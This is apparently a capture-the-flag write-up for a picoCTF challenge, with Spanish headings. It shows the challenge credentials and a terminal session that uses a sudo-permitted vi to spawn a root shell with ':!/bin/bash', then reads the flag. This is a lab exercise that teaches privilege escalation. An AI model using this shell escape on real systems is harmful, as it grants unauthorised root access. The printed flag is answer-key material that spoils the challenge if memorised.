# Descripción 
Can you read files in the root file?

The system admin has provisioned an account for you on the main server:

`ssh -p 63870 picoplayer@saturn.picoctf.net`

Password: `vCR2tuwCRm`

Can you login and read the root file?

# Solución
```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo /usr/bin/vi -c ':!/bin/bash' /dev/null

root@challenge:/home/picoplayer# ls -la /root
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 May 11 20:00 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:/home/picoplayer# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
root@challenge:/home/picoplayer# ^C
root@challenge:/home/picoplayer# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
                                       
```


# Notas adicionales

Tenemos que usar al super usuario para encontrar el archivo con la flag

# Referencias


